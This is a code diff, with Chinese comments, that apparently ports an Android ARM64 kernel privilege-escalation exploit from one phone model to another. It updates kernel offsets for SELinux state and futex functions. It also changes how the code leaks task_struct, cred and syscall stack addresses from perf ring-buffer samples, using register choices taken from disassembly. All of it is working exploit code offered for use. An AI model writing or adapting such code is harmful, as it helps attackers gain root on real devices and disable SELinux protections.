@@ -61,7 +61,7 @@ static double timer_ms(void) {
 #define OFF_SELINUX_STATE UINT64_C(0x29c0000)
 #define OFF_LOG_BUF UINT64_C(0x29d4784)
 #define OFF_TASK_STATE UINT64_C(0x52c218)
-#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x31f5cc)
+#define OFF_FUTEX_WAIT_REQUEUE_PI UINT64_C(0x31f4ec)
 #define OFF_SEL_READ_ENFORCE UINT64_C(0x6941c4)
 #define ARM64_REG_COUNT 33
 #define ARM64_REG_MASK ((UINT64_C(1) << ARM64_REG_COUNT) - 1)
@@ -256,7 +256,10 @@ static uint64_t leak_task_from_status(const char *status_path, uint64_t *cred_ou
       uint64_t state = runtime_text + OFF_TASK_STATE;
       if (abi && ip >= state && ip < state + 0x720 &&
           pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
-        unsigned task_reg = ip <= state + 0x24 ? 3 : 26;
+        /* A93: proc_pid_status 入口处 "mov x20, x3" 把 task 存进 x20，
+         * 且 x20 是 callee-saved、函数内再未写回，所以整个窗口内都是 task。
+         * Reno7 那边是 x3/x26，这里换成 x20。 */
+        unsigned task_reg = 20;
         uint64_t task = ring_u64(ring, size, pos + task_reg * 8);
         if (task >= UINT64_C(0xffffff8000000000) &&
             task < UINT64_C(0xffffffc000000000) && !(task & 7)) {
@@ -335,9 +338,14 @@ static uint64_t leak_syscall_sp(void) {
       pos += 16;
       uint64_t nr = ring_u64(ring, size, pos); pos += 8 + nr * 8;
       uint64_t abi = ring_u64(ring, size, pos); pos += 8;
-      if (abi && ip >= fun + 0x80 && ip < fun + 0x380 &&
+      /* A93 的 futex_unlock_pi 只有 0x660 字节，waiter 不在 sp 上而在帧指针上：
+       *   +0x618: sub x1, x29, #40     ← waiter = x29 - 40
+       *   +0x620: bl  __rt_mutex_futex_unlock
+       * 所以窗口收窄到那 8 个字节，地址从 x29 推，而不是 x31。 */
+      if (abi && ip >= fun && ip < fun + 0x8 &&
           pos + ARM64_REG_COUNT * 8 <= tail + h.size) {
-        uint64_t sp = ring_u64(ring, size, pos + 31 * 8);
+        uint64_t fp = ring_u64(ring, size, pos + 29 * 8);
+        uint64_t sp = fp - 40;
         uint64_t syscall_sp = sp + 0x230;
         unsigned slot;
         for (slot = 0; slot < 16 && candidates[slot] &&
